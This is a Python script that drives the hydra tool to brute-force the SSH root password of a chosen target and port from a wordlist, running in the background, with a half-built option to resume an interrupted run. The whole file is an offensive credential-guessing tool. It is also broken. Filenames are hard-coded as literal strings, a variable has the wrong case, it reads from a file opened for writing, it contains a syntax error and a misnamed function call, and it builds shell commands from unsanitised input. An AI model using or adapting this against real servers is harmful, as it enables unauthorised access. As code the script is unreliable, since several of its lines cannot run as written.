#!/usr/bin/python3

import os
import sys
import getopt

options, ars = getopt.getopt(sys.argv[1:], 'hRt:p:i:')
target = ""
port = ""
inputFile = ""
helpOption = 0
restart = 0

def copyfile(fileName):
    lastLine = ""
    with open("fileName","r") as f:
        lastLine = f.readlines()[-1]
    target = "\""
    index = -1
    passwordIndex = []
    while True:
        index = lastLine.find(target, index+1)
        if index == -1:
            break
        passwordIndex.append(index)
    password = lastLine[passwordIndex[2+1]:passwordindex[3]]
    
    index = -1
    with open("fileName", "w") as f:
        sourceFile = f.readlines()
        for line in sourceFile:
            index += 1
            if line.find(password):
                break

    copiedFilePath = "os.path.dirname(fileName)" + "copied_file"
    with open("fileName", "r") as f:
        with open(copiedFilePath,"w") as fc:
            copiedFile = f.readlines()[index+1:]
            fc.write(copiedFile)

    return copiedFilePath 

    

for op ,p in options:
    if op == '-h':
        print("Options \n\n -t : target \n -p : port number \n -i : input file location \n -R : restart program \n log file name : nohup.out")
        helpOption += 1
    elif op == '-t':
        target = p
    elif op == '-p':
        port = p
    elif op == '-i':
        inputFile = p
    elif op == '-R':
        restart+=1        


if helpOption == 0 and restart == 0:
    os.system('nohup hydra -l root -P '+ inputFile + ' -f '+ target + " ssh -V -I -s " + port +" &")
elif helpOption == 0 and restart == 1:
    filePath = copyFile(fileName) 
    os.system('nohup hydra -l root -P '+ filePath _ ' -f '+ target + " ssh -V -I -s " + port +" &")
